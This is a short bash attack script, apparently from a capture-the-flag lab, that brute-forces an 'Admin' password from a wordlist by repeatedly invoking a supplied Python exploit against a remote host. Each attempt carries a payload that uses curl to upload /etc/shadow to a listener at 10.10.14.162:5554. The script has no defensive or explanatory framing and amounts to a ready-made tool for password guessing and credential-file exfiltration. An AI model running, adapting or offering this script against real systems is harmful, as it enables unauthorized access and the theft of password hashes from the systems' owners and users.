#!/bin/bash

username=Admin

#------------Handles Flag Arguments--------
while getopts w:s:h:p:l: flag
do
    case "${flag}" in
        w) wordlist=${OPTARG};;
	s) script=${OPTARG};;
	p) port=${OPTARG};;
	h) host=${OPTARG};;
	l) localhost=${OPTARG};;
	#h) help=${OPTARG};;
    esac
done


#------------Check for arguments----------
if [ "$#" -lt 5 ]
  then
    echo "
				    [-p Port]
                                    [-l Local host]
                                    [-h Remote host]
                                    [-s Script]
				    [-w Password List]"
fi

#------------Read Word List-----------------
while read line;
do
	#echo "Trying Username:$username Password:$line"
	python $script --host $host --port $port --username $username --password $line --lhost $localhost --payload 'curl -F "data=@/etc/shadow" http://10.10.14.162:5554'

done < $wordlist

